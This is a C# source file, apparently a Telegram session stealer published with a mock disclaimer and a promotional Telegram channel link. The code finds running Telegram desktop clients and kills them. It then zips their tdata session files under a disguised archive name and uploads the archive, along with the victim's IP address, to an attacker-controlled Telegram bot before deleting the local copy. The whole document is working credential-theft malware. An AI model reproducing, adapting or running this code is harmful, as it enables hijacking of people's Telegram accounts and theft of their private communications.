/*
peredoz version : 1.5
attention : МЫ НЕ НЕСЁМ ОТВЕТСТВЕННОСТЬ ЗА ДЕЙСТВИЯ ПОЛЬЗОВАТЕЛЕЙ. ДАННЫЙ КОД СОЗДАН ИСКЛЮЧИТЕЛЬНО ДЛЯ ТЕСТОВ НА САМОМ СЕБЕ И НЕ ПОДРАЗУМЕВАЕТ РАСПРОСТРАНЕНИЕ ВРЕДОНОСА. ИСКЛЮЧИТЕЛЬНО В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛАЯХ!!!!!!11!1
    __                                           ______ 
   / /_________  ____  ______ _____ __________  / __/ /_
  / //_/ ___/ / / / / / / __ `/ __ `/ ___/ __ \/ /_/ __/
 / ,< / /  / /_/ / /_/ / /_/ / /_/ (__  ) /_/ / __/ /_  
/_/|_/_/   \__, /\__, /\__,_/\__,_/____/\____/_/  \__/  
          /____//____/                                  

[ Заходи в наш телеграм канал! https://t.me/kryyaasoft ]
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private static readonly string BotToken = "token"; // Telegram Bot Token (@botfather)
    private static readonly string AdminId = "id"; // Telegram admin chat ID (@getmyid_bot)

    static async Task Main(string[] args)
    {
        var stopwatch = Stopwatch.StartNew();
        await CheckAndGrab();
        stopwatch.Stop();
    }

    static string FindProcessPath(string processName)
    {
        var processes = Process.GetProcesses();
        foreach (var process in processes)
        {
            if (process.ProcessName.Equals(processName, StringComparison.OrdinalIgnoreCase))
            {
                return process.MainModule.FileName;
            }
        }
        return null;
    }

    static async Task<string> GetUserIpAsync()
    {
        using var httpClient = new HttpClient();
        try
        {
            var ip = await httpClient.GetStringAsync("https://wtfismyip.com/text");
            return ip.Trim(); // Убираем лишние пробелы и символы
        }
        catch
        {
            return "Не удалось получить IP";
        }
    }

    static async Task Grb(string proc, string clientPath, TimeSpan elapsedTime, string userIp)
    {
        var processPath = FindProcessPath(proc);
        if (processPath != null)
        {
            var process = Process.GetProcessesByName(proc).FirstOrDefault();
            if (process != null)
            {
                process.Kill();
                process.WaitForExit();
            }
        }

        await Task.Delay(700); // kryyaa
        Directory.SetCurrentDirectory(Path.Combine(clientPath, "tdata"));

        var neededFiles = new List<string>();

        // @kryyaasoft
        var files = Directory.GetFiles(Directory.GetCurrentDirectory());
        var directories = Directory.GetDirectories(Directory.GetCurrentDirectory());

        // kryyaasoft.t.me
        var keyDataFile = Path.Combine(Directory.GetCurrentDirectory(), "key_datas");
        if (File.Exists(keyDataFile))
        {
            neededFiles.Add(keyDataFile); // kryyaa sigma boooyyyy
        }

        var settingssFile = Path.Combine(Directory.GetCurrentDirectory(), "settingss");
        if (File.Exists(settingssFile))
        {
            neededFiles.Add(settingssFile); // kryyaa sigma boooyyyy
        }

        var usertagFile = Path.Combine(Directory.GetCurrentDirectory(), "usertag");
        if (File.Exists(usertagFile))
        {
            neededFiles.Add(usertagFile); // kryyaa sigma boooyyyy
        }

        foreach (var directory in directories)
        {
            var folderName = Path.GetFileName(directory);
            var correspondingFile = Path.Combine(Directory.GetCurrentDirectory(), folderName + "s");

            if (File.Exists(correspondingFile))
            {
                neededFiles.Add(correspondingFile); // kryyaasoft
                neededFiles.Add(directory); // kryyaasoft

                // kryyaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                var mapsFile = Path.Combine(directory, "maps");
                var configsFile = Path.Combine(directory, "configs");

                if (File.Exists(mapsFile))
                {
                    neededFiles.Add(mapsFile);
                }

                if (File.Exists(configsFile))
                {
                    neededFiles.Add(configsFile);
                }
            }
        }

        await CreateArchive(neededFiles, "tiktok.zip");

        using var httpClient = new HttpClient();
        var requestContent = new MultipartFormDataContent
        {
            { new StringContent(AdminId), "chat_id" },
            { new StringContent("HTML"), "parse_mode" },
            { new StringContent($"[NEW TDATA] @kryyaasoft work \nclient: {proc} \nВремя выполнения: {elapsedTime.TotalSeconds} секунд \nIP: {userIp}"), "caption" },
        };

        using (var fileStream = new FileStream("tiktok.zip", FileMode.Open, FileAccess.Read))
        {
            requestContent.Add(new StreamContent(fileStream), "document", "tiktok.zip");
            await httpClient.PostAsync($"https://api.telegram.org/bot{BotToken}/sendDocument", requestContent);
        }

        if (File.Exists("tiktok.zip"))
        {
            File.Delete("tiktok.zip");
        }
    }

    static async Task CreateArchive(List<string> filePaths, string archiveName)
    {
        string archivePath = Path.Combine(Directory.GetCurrentDirectory(), archiveName);

        using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
        {
            foreach (var filePath in filePaths)
            {
                if (File.Exists(filePath))
                {
                    archive.CreateEntryFromFile(filePath, Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath));
                }
                else if (Directory.Exists(filePath))
                {
                    archive.CreateEntry(Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath) + "/");
                }
            }
        }
    }

    static async Task CheckAndGrab()
    {
        var stopwatch = Stopwatch.StartNew();
        var userIp = await GetUserIpAsync(); // Получаем IP пользователя
        var tasks = new List<Task>();
        var processes = new[] { "Unigram", "Telegram", "AyuGram", "Kotatogram", "iMe" };

        foreach (var process in processes)
        {
            var path = FindProcessPath(process);
            if (!string.IsNullOrEmpty(path))
            {
                tasks.Add(Grb(process, Path.GetDirectoryName(path), stopwatch.Elapsed, userIp));
            }
        }

        await Task.WhenAll(tasks);
        stopwatch.Stop();
    }
}